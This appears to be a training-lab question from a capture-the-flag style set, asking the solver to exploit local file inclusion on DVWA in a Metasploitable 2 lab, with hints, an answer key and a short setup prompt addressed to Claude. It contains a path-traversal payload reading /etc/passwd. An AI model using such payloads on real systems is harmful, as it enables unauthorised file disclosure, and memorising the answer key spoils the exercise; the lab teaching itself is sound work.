# Q072 — DVWA Local File Inclusion

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` (Metasploitable 2) |
| **Domain** | 12 — Web Apps / 13 — SQLi |
| **Difficulty** | 🟡 Medium |
| **Tools** | `curl (or browser)` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Exploit LFI on DVWA `vulnerabilities/fi/?page=`. Read `/etc/passwd`.

---

## 🎯 Flag Format

```
payload=<text>
```

Example: `payload=../../../../etc/passwd`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Climb directories with `../`.
</details>

<details>
<summary>Hint 2</summary>

Low security has no filter.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
# http://192.168.52.129/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
```

Renders /etc/passwd contents.

**Answer:** `payload=../../../../etc/passwd`

📖 Ref: [playbooks/webapp-playbook.md](../../playbooks/webapp-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q072:
1. DVWA up; security=low; logged in.
2. LFI page /dvwa/vulnerabilities/fi/ enabled (allow_url_include is on in Metasploitable2 php.ini by default).

Report back: "Lab ready for Q072 — DVWA fi page reachable, security=low".
```
